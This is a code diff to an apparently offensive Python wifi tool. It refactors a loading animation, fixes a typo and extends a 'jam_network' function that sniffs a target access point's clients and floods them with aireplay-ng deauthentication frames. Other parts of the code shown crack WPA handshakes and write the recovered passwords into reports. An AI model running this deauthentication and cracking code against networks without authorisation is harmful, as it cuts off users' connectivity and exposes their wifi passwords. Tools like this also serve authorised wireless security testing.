@@ -114,9 +114,21 @@ Cipher: {target_ap['Cipher']}
 Cracked wifi password: {crack}
      """
 
-     create_cap_dir(target, output_dir)
+     create_dir(f'{output_dir}/reports')
      with open(f'{output_dir}/reports/{filename}.report', 'w') as report:
           report.write(template)
+
+def loading_animation(message): 
+     spinner = ['|', '/', '-', '\\']
+     idx = 0
+     try:
+          while True:
+               sys.stdout.write(f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} {message}")
+               sys.stdout.flush()
+               idx += 1
+               time.sleep(0.1)
+     except:
+          pass
 
 
 #---------------------------------
@@ -548,7 +560,7 @@ def list_ap(wifi_networks):
 
  #-----------------------------------------------------------------------------------
 
-# | Handshake Crack | #
+# | AP Client Scan | #
 
 def sniff_clients(interface, target_ap, target):
      standardized_MACs = ['ff:ff:ff:ff:ff:ff', '01:80:c2:00:00:00', '01:80:c2:00:00:0e', '01:00:5e', '33:33']
@@ -565,7 +577,7 @@ def sniff_clients(interface, target_ap, target):
                          # Check if not one of the standardized MAC addresses
                          if not any(pkt.addr1.startswith(mac) for mac in standardized_MACs): 
                               #print(f'2 {pkt.addr2} = {target_ap}, | {pkt.addr1} |')
-                              clients.apppend(pkt.addr1)
+                              clients.append(pkt.addr1)
 
                     elif pkt.addr1 == target_ap and pkt.addr2 not in clients:
                          # Check if not one of the standardized MAC addresses
@@ -578,22 +590,11 @@ def sniff_clients(interface, target_ap, target):
                sniff(iface=interface, prn=packet_handler, timeout=8)
           except KeyboardInterrupt:
                interrupted.value = True
-     # Run loading animation while sniff_clients function runs
-     def loading_animation(): 
-          spinner = ['|', '/', '-', '\\']
-          idx = 0
-          try:
-               while True:
-                    sys.stdout.write(f"\r{CYAN}{spinner[idx % len(spinner)]}{RESET} Scanning for {target}'s clients")
-                    sys.stdout.flush()
-                    idx += 1
-                    time.sleep(0.1)
-          except:
-               pass
 
      # Define processews
      process = multiprocessing.Process(target=sniffing_process, args=(interrupted,))
-     loading = multiprocessing.Process(target=loading_animation)
+     loading_message = f"Scanning for {target}'s clients"
+     loading = multiprocessing.Process(target=loading_animation, args=(str(loading_message),))
      process.start() 
      loading.start() # Start of loading animation
 
@@ -641,6 +642,10 @@ def choose_target_client(sniffed_clients):
                     print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
      except KeyboardInterrupt:
           pass
+
+#-----------------------------------------------------------------------------------
+
+# | Handshake Crack | #
 
 def handshake_crack(target_ap, interface, deauth_mode, target):
      global sniffed_clients, wifighter_path
@@ -821,7 +826,6 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                     if password_match:
                          password = password_match.group(1)
                          print(f"\n{YELLOW}[>]{RESET} Password cracked! [ {password} ]")
-                         create_dir(f'{output_dir}/reports')
                          generate_report('Handshake Crack', target_ap, password, target, output_dir)
           except KeyboardInterrupt:
                pass
@@ -835,6 +839,8 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
 # | Jamming | #
 
 def jam_network(target_ap, interface, jammer_mode): 
+     global sniffed_clients
+
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
      bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
@@ -843,25 +849,48 @@ def jam_network(target_ap, interface, jammer_mode):
      target_client = None
 
 
+     # Set deauth client if attack mode "Client deauth"
+     if jammer_mode == 'client jamming':
+          logo()
+          while True:
+               sniff_result, interrupted = sniff_clients(interface, bssid, target) # Get available AP's
+               if not interrupted:
+                    sniffed_clients = sniff_result # Set sniffed clients list only when the sniff wasn't ended earlier with ctrl + c (only on natural end of each sniff scanning)
+               logo()
+               list_clients(sniffed_clients, ssid, bssid) # Show the sniff results periodically in table
+               if interrupted: # Break the while cycle when Keyboardinterrupt is caught in the sniff function
+                    break
+
+          # Let user choose client as target
+          if sniffed_clients:
+               try:
+                    target_client = choose_target_client(sniffed_clients)
+               except:
+                    pass
+
      def run_aireplay(interface, bssid, target, target_client, jammer_mode):
+          loading_message = None
+          if jammer_mode == 'client jamming':
+               loading_message = f"Jamming {target_client} on {target}... ( Press [Ctrl + C] to stop )"
+          if jammer_mode == 'broadcast jamming':
+               loading_message = f"Jamming all clients on {target}... ( Press [Ctrl + C] to stop )"
+          loading = multiprocessing.Process(target=loading_animation, args=(str(loading_message),))
+          loading.start() # Run loading animation while sniff_clients function runs
+          
           if interface and bssid and jammer_mode:
                if jammer_mode == "client jamming":
                     if target_client:
                          try:
                               # Continuosly deauth client
-                              print(f"{CYAN}[>]{RESET}Jamming {target_client} on {target}... []{RESET}")
-                              print("Press [Ctrl + C] to stop")
                               command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', target_client, interface]
                               subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                          except:
                               pass
                     else:
-                         print(f'{RED}No target client set!\n{RESET}')
+                         print(f'{RED}No target client set! Skipping...{RESET}')
                elif jammer_mode == "broadcast jamming":
                     try:
                          # Continuosly deauth deauth all clients
-                         print(f"{CYAN}[>]{RESET} Jamming all clients on {target}...")
-                         print("Press [Ctrl + C] to stop")
                          command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
                          subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     except:
@@ -869,8 +898,11 @@ def jam_network(target_ap, interface, jammer_mode):
                else:
                     pass
 
-     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target, target_client, jammer_mode))
+          loading.terminate() # End the loading animation
      
+     # Define process
+     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target, target_client, jammer_mode))
+
      logo()
      print(f'{CYAN}| Jamming |{RESET}\n')
      # Run aireplay-ng
